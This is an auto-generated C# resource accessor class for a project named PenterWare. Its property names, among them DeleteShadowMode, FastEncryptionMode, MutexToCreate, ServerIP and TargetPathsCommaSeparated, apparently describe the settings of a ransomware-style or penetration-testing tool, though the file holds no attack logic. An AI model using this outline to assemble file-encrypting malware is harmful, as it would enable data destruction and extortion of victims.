using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

namespace PenterWare.Properties;

[DebuggerNonUserCode]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[CompilerGenerated]
internal class Resources
{
	private static ResourceManager resourceMan;

	private static CultureInfo resourceCulture;

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static ResourceManager ResourceManager
	{
		get
		{
			if (resourceMan == null)
			{
				resourceMan = new ResourceManager("PenterWare.Properties.Resources", typeof(Resources).Assembly);
			}
			return resourceMan;
		}
	}

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static CultureInfo Culture
	{
		get
		{
			return resourceCulture;
		}
		set
		{
			resourceCulture = value;
		}
	}

	internal static string AsymmetricAlgorithm => ResourceManager.GetString("AsymmetricAlgorithm", resourceCulture);

	internal static string DeleteShadowMode => ResourceManager.GetString("DeleteShadowMode", resourceCulture);

	internal static string DNSsCommaSeparated => ResourceManager.GetString("DNSsCommaSeparated", resourceCulture);

	internal static string FastEncryptionMode => ResourceManager.GetString("FastEncryptionMode", resourceCulture);

	internal static string FilesystemBackupType => ResourceManager.GetString("FilesystemBackupType", resourceCulture);

	internal static string MaxCopySizeMB => ResourceManager.GetString("MaxCopySizeMB", resourceCulture);

	internal static string MutexToCreate => ResourceManager.GetString("MutexToCreate", resourceCulture);

	internal static string OsCommands => ResourceManager.GetString("OsCommands", resourceCulture);

	internal static string PathSuffixesCommaSeparated => ResourceManager.GetString("PathSuffixesCommaSeparated", resourceCulture);

	internal static string PathToAccess => ResourceManager.GetString("PathToAccess", resourceCulture);

	internal static string Port => ResourceManager.GetString("Port", resourceCulture);

	internal static string RegistryPathsCommaSeparated => ResourceManager.GetString("RegistryPathsCommaSeparated", resourceCulture);

	internal static string ServerIP => ResourceManager.GetString("ServerIP", resourceCulture);

	internal static string Strings => ResourceManager.GetString("Strings", resourceCulture);

	internal static string SymmetricAlgorithm => ResourceManager.GetString("SymmetricAlgorithm", resourceCulture);

	internal static string TargetPathsCommaSeparated => ResourceManager.GetString("TargetPathsCommaSeparated", resourceCulture);

	internal static string Transport => ResourceManager.GetString("Transport", resourceCulture);

	internal static string UrlsCommaSeparated => ResourceManager.GetString("UrlsCommaSeparated", resourceCulture);

	internal static string Verbose => ResourceManager.GetString("Verbose", resourceCulture);

	internal Resources()
	{
	}
}
